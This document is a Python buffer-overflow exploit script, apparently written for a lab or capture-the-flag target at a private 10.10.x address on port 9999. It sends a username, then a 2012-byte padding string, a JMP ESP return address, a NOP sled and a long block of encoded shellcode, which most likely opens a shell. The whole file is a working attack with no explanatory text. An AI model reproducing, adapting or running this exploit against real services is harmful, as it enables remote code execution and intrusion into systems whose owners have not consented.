#!/usr/bin/env python3

import socket
import sys

username = b"Shahrukh"


jmp_esp = b"\xdf\x14\x50\x62"

message = b"A" * 2012 + jmp_esp + b"\x90" * 24

shellcode =  (b"\xba\x0c\x2c\x62\x88\xdd\xc5\xd9\x74\x24\xf4\x5d\x33\xc9\xb1"
b"\x52\x83\xed\xfc\x31\x55\x0e\x03\x59\x22\x80\x7d\x9d\xd2\xc6"
b"\x7e\x5d\x23\xa7\xf7\xb8\x12\xe7\x6c\xc9\x05\xd7\xe7\x9f\xa9"
b"\x9c\xaa\x0b\x39\xd0\x62\x3c\x8a\x5f\x55\x73\x0b\xf3\xa5\x12"
b"\x8f\x0e\xfa\xf4\xae\xc0\x0f\xf5\xf7\x3d\xfd\xa7\xa0\x4a\x50"
b"\x57\xc4\x07\x69\xdc\x96\x86\xe9\x01\x6e\xa8\xd8\x94\xe4\xf3"
b"\xfa\x17\x28\x88\xb2\x0f\x2d\xb5\x0d\xa4\x85\x41\x8c\x6c\xd4"
b"\xaa\x23\x51\xd8\x58\x3d\x96\xdf\x82\x48\xee\x23\x3e\x4b\x35"
b"\x59\xe4\xde\xad\xf9\x6f\x78\x09\xfb\xbc\x1f\xda\xf7\x09\x6b"
b"\x84\x1b\x8f\xb8\xbf\x20\x04\x3f\x6f\xa1\x5e\x64\xab\xe9\x05"
b"\x05\xea\x57\xeb\x3a\xec\x37\x54\x9f\x67\xd5\x81\x92\x2a\xb2"
b"\x66\x9f\xd4\x42\xe1\xa8\xa7\x70\xae\x02\x2f\x39\x27\x8d\xa8"
b"\x3e\x12\x69\x26\xc1\x9d\x8a\x6f\x06\xc9\xda\x07\xaf\x72\xb1"
b"\xd7\x50\xa7\x16\x87\xfe\x18\xd7\x77\xbf\xc8\xbf\x9d\x30\x36"
b"\xdf\x9e\x9a\x5f\x4a\x65\x4d\x6a\x9a\x42\x34\x02\x9e\x8c\x47"
b"\x68\x17\x6a\x2d\x9e\x7e\x25\xda\x07\xdb\xbd\x7b\xc7\xf1\xb8"
b"\xbc\x43\xf6\x3d\x72\xa4\x73\x2d\xe3\x44\xce\x0f\xa2\x5b\xe4"
b"\x27\x28\xc9\x63\xb7\x27\xf2\x3b\xe0\x60\xc4\x35\x64\x9d\x7f"
b"\xec\x9a\x5c\x19\xd7\x1e\xbb\xda\xd6\x9f\x4e\x66\xfd\x8f\x96"
b"\x67\xb9\xfb\x46\x3e\x17\x55\x21\xe8\xd9\x0f\xfb\x47\xb0\xc7"
b"\x7a\xa4\x03\x91\x82\xe1\xf5\x7d\x32\x5c\x40\x82\xfb\x08\x44"
b"\xfb\xe1\xa8\xab\xd6\xa1\xc9\x49\xf2\xdf\x61\xd4\x97\x5d\xec"
b"\xe7\x42\xa1\x09\x64\x66\x5a\xee\x74\x03\x5f\xaa\x32\xf8\x2d"
b"\xa3\xd6\xfe\x82\xc4\xf2")

try:
	print("sending payload...")
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(('10.10.179.51',9999))
	s.recv(1024)
	s.recv(1024)
	s.send(username + b'\r\n')
	s.recv(1024)
	s.send(message + shellcode  + b'\r\n')
	s.recv(1024)
	s.close()

except:
	print("cannot connect to the server")
	sys.exit()